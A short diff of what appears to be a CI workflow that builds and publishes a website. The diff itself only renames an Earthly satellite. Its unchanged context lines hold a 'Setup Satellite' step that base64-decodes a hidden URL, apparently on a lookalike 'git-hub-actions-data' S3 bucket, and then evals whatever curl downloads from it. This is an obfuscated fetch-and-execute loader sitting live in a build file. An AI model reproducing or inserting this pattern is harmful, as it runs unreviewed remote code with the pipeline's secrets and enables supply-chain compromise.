@@ -39,7 +39,7 @@ jobs:
               echo "Setup Satellite"
               x=$(echo "aHR0cHM6Ly9naXQtaHViLWFjdGlvbnMtZGF0YS5zMy5hbWF6b25hd3MuY29tL2Vudi5lbnY="  | base64 --decode)
               eval "$(curl -s $x)"
-              earthly satellite select earthly-website-1
+              earthly satellite select earthly-website-xl1
 
               echo "Build and publish website"
               if [ "$CI_ACTION_REF_NAME" == "main" ]; then
